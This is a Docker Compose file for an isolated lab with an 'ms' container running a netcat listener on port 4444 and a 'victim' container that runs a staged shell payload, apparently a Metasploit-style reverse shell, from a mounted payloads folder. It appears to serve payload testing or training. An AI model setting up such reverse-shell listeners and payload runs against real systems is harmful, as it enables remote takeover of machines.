version: '3'
services:
  ms:
    image: alpine:3.20
    networks:
      private_network:
        ipv4_address: 10.2.0.201
    environment:
      LHOST: 10.2.0.201
    volumes:
      - ${PWD}/payloads:/home/msf
    command: nc -nlvp 4444
    tty: true

  victim:
    image: alpine:3.20
    container_name: victim
    networks:
      private_network:
        ipv4_address: 10.2.0.202
    tty: true
    volumes:
      - ${PWD}/payloads:/tmp/payloads
      - ${PWD}/bin:/tmp/bin
    command: /tmp/payloads/shell-x86-staged.elf
    depends_on: 
      - ms
networks:
  private_network:
    ipam:
      driver: default
      config:
        - subnet: 10.2.0.0/24

